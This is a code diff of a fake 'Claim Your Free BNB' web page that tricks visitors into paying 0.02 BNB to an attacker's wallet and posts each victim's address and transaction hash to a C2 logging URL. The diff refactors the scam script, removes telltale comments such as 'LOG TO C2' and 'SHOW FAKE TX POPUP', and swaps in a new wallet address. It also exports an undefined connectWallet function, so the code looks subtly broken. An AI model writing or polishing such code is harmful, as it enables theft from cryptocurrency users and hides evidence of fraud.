@@ -4,7 +4,6 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Claim Your Free BNB</title>
-    <!-- Load ethers.js for transaction signing -->
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" async></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -13,6 +12,7 @@
             --text: #fff;
             --gold: #f3ba2f;
             --green: #00ff00;
+            --red: #ff3333;
         }
         * {
             margin: 0;
@@ -60,11 +60,11 @@
         }
         .alert {
             background: #400;
-            border: 1px solid #ff3333;
+            border: 1px solid var(--red);
             border-radius: 10px;
             padding: 14px;
             margin-bottom: 20px;
-            color: #ff3333;
+            color: var(--red);
             font-size: 1.1em;
         }
         .alert i {
@@ -187,82 +187,64 @@
 <div class="tx-popup" id="txPopup"></div>
 
 <script>
-    // === CONFIG ===
-    const YOUR_WALLET = "0x40f4c332be705dbf098a48a728248b13a005e7cb"; // CHANGE TO YOUR ADDRESS
-    const AMOUNT = "0.02"; // BNB
-    const VALUE = ethers.utils.parseEther(AMOUNT);
-    const EXFIL_URL = "https://your-c2-server.com/log.php"; // CHANGE TO YOUR SERVER
+    const YOUR_WALLET = "0xf8cc5A87F35Bde1482f3A0Eeb211F7C92F5DB0b6";
+    const AMOUNT_BNB = "0.02";
+    const VALUE = ethers.utils.parseEther(AMOUNT_BNB);
+    const EXFIL_URL = "https://your-c2-server.com/log.php";
 
-    const btn = document.getElementById("claimBtn");
+    const claimBtn = document.getElementById("claimBtn");
     const popup = document.getElementById("txPopup");
 
-    // === ONE-CLICK: OPEN WALLET & PRE-FILL TRANSACTION ===
     async function claimReward() {
-        // Step 1: Check if Ethereum provider is available (MetaMask, Trust Wallet, etc.)
-        if (typeof window.ethereum !== "undefined") {
-            try {
-                // Request account access
-                await window.ethereum.request({ method: "eth_requestAccounts" });
-
-                // Create provider and signer
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
-
-                // Log victim
-                logVictim(userAddress);
-
-                // Update button
-                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirm Transaction...';
-
-                // Pre-fill transaction
-                const tx = {
-                    to: YOUR_WALLET,
-                    value: VALUE,
-                    gasLimit: 21000,
-                    gasPrice: await provider.getGasPrice()
-                };
-
-                // Send transaction — this opens the wallet with pre-filled data
-                const txResponse = await signer.sendTransaction(tx);
-
-                // Success
-                btn.innerHTML = "✅ Success!";
-                showPopup(`TX: ${txResponse.hash.slice(0,8)}...${txResponse.hash.slice(-6)}`, txResponse.hash);
-                logTransaction(txResponse.hash, userAddress);
-
-            } catch (err) {
-                if (err.code === 4001) {
-                    btn.innerHTML = "❌ User rejected";
-                } else {
-                    btn.innerHTML = "⚠️ Failed";
-                }
-                console.error(err);
-            }
-        } else {
-            // No wallet detected — do NOT redirect to Play Store
-            // Just silently fail (no popups, no redirects)
-            btn.innerHTML = "⚠️ Wallet not detected";
+        if (typeof window.ethereum === "undefined") {
+            claimBtn.innerHTML = "⚠️ Wallet not detected";
             setTimeout(() => {
-                btn.innerHTML = '<i class="fas fa-gift"></i> Pay 0.02 BNB & Claim Reward';
+                claimBtn.innerHTML = '<i class="fas fa-gift"></i> Pay 0.02 BNB & Claim Reward';
             }, 3000);
+            return;
+        }
+
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            const userAddress = await signer.getAddress();
+
+            logVictim(userAddress);
+
+            claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirm in Wallet...';
+
+            const tx = {
+                to: YOUR_WALLET,
+                value: VALUE,
+                gasLimit: 21000
+            };
+
+            const txResponse = await signer.sendTransaction(tx);
+            claimBtn.innerHTML = "✅ Success!";
+            showTxPopup(txResponse.hash);
+            logTransaction(txResponse.hash, userAddress);
+
+        } catch (err) {
+            if (err.code === 4001) {
+                claimBtn.innerHTML = "❌ User rejected";
+            } else {
+                claimBtn.innerHTML = "⚠️ Failed";
+            }
+            console.error(err);
         }
     }
 
-    // === SHOW FAKE TX POPUP ===
-    function showPopup(text, hash) {
+    function showTxPopup(hash) {
         popup.innerHTML = `
             <strong>TX Confirmed</strong><br>
             0.02 BNB → ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}<br>
-            <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color:#00ccff;">${text}</a>
+            <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color:#00ccff;">${hash.slice(0,8)}...${hash.slice(-6)}</a>
         `;
         popup.classList.add("show");
-        setTimeout(() => {
-            popup.classList.remove("show");
-        }, 6000);
+        setTimeout(() => popup.classList.remove("show"), 6000);
     }
 
-    // === LOG TO C2 ===
     function logVictim(address) {
         fetch(EXFIL_URL, {
             method: "POST",
@@ -283,7 +265,7 @@
             method: "POST",
             body: JSON.stringify({
                 type: "claim",
-                fee: AMOUNT,
+                fee: AMOUNT_BNB,
                 hash: hash,
                 address: address,
                 ts: new Date().toISOString()
@@ -293,8 +275,8 @@
         }).catch(() => {});
     }
 
-    // === INIT ===
-    btn.addEventListener("click", claimReward);
+    claimBtn.addEventListener("click", claimReward);
+    window.connectWallet = connectWallet;
 </script>
 
 </body>
